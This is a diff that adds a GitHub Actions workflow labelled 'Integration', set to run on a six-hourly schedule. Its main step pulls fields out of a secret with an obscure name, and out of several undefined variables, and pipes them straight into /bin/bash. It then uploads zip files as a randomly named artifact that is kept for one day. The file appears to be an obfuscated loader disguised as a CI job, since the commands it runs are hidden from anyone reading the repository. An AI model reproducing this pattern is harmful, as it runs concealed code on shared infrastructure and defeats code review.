@@ -1,0 +1,29 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '35 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  action:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Begin
+        env:
+          y39: ${{ secrets.y39 }}
+        run: |
+          printf '%s' "$y39" | jq -r .psbl4 | /bin/bash
+          echo $cpovw84 | jq -r .cgclp5388 | /bin/bash
+          printf '%s' "$z004" | jq -r .ryj06 | /bin/bash
+          echo $o66 | jq -r .f949 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: uohBm8VY
+          path: "*.zip"
+          retention-days: 1
